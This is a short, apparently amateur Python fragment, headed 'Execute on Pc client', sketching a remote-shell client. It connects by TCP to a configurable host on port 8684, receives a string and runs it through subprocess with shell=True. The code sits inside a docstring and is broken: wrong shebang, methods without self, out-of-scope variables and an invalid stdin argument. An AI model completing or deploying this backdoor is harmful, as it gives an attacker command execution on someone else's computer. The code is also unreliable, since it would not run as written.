#Execute on Pc client

#!usr/bin/python
"""
import socket 
import subprocess

class client_m(object):
	def __init__(self):
		pass

	def conMain():
		clt = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		ipc = ''
		portc = 8684
	
	def coneOn():
		try:
			clt.connect((ipc,portc))
			response = clt.recv(4096)
			print('[*] @ Response : {}'.format(response))

		except:
			conMain()

	def sucess():
		while True:
			proc = subprocess.Popen(response, shell =  True,stdin = subprocess, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			clt.send('[*] @ Connection on')
"""